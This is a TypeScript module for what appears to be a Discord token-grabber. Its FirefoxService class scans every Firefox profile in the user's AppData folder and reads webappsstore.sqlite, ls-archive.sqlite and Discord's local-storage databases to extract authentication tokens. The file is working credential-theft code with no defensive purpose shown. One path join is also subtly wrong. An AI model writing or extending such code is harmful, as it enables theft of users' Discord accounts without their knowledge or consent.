import * as Bluebird from 'bluebird';
import * as fs from 'promise-fs';
import * as path from 'path';
import * as os from 'os';

import { List } from '@assasans/storage';

import { Token } from '../token';
import { Service } from './service';

export class FirefoxService extends Service {
	public constructor(name: string, directory: string) {
		super(name, directory);
	}

	public async getTokens(): Promise<List<Token>> {
		const tokens: List<Token> = new List<Token>();

		const profilesDirectory = path.join(
			os.homedir(),
			'AppData',
			this.directory,
			'Profiles'
		);
		if(!await this.exists(profilesDirectory)) return tokens;

		const profileDirectories: string[] = (await fs.readdir(profilesDirectory, { encoding: 'utf8' }))
			.map((relative: string) => path.join(profilesDirectory, relative));

		await Bluebird.all(profileDirectories.map(async (profileDirectory: string) => {
			try {
				if(!(await fs.stat(profileDirectory)).isDirectory()) return;
			} catch(error) {
				console.error(error);
				return;
			}

			try {
				const storagePath: string = path.join(profileDirectory, 'webappsstore.sqlite');
				if(!await this.exists(storagePath)) return;
				
				const content: string = await fs.readFile(storagePath, { encoding: 'utf8' });
				tokens.addRange(this.extractTokens(content));
			} catch(error) {
				console.error(error);
			}

			try {
				const archivePath: string = path.join(profileDirectory, 'storage/ls-archive.sqlite');
				if(!await this.exists(archivePath)) return;
				
				const content: string = await fs.readFile(archivePath, { encoding: 'utf8' });
				tokens.addRange(this.extractTokens(content));
			} catch(error) {
				console.error(error);
			}

			try {
				const storageDirectoryRoot: string = path.join(profileDirectory, 'storage/default');
				if(!await this.exists(storageDirectoryRoot)) return;

				const storageDirectories: string[] = (await fs.readdir(storageDirectoryRoot, { encoding: 'utf8' }))
					.filter((name: string) => /discord(?:app)?\.com/.test(name))
					.map((relative: string) => path.join(profileDirectory, relative));

				await Bluebird.all(storageDirectories.map(async (storageDirectory: string) => {
					try {
						if(!(await fs.stat(storageDirectory)).isDirectory()) return;
					} catch(error) {
						console.error(error);
						return;
					}

					try {
						const storagePath: string = path.join(storageDirectory, 'ls/data.sqlite');
						if(!await this.exists(storagePath)) return;

						const content: string = await fs.readFile(storagePath, { encoding: 'utf8' });
						tokens.addRange(this.extractTokens(content));
					} catch(error) {
						console.error(error);
					}
				}));
			} catch(error) {
				console.error(error);
			}
		}));

		return tokens;
	}
}
